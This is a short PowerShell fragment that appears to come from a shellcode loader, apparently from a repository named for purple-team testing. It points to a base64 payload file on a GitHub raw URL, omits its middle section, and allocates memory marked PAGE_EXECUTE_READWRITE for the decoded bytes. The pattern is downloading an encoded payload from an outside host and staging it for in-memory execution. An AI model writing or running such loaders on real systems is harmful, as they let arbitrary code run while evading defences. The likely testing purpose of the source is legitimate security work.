$server = "https://raw.githubusercontent.com/crzyscholar/Purple-Tools/refs/heads/main/base64.txt"
...
$Buffer = $Memory::VirtualAlloc([IntPtr]::Zero, [uint32]$bytes.Length, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
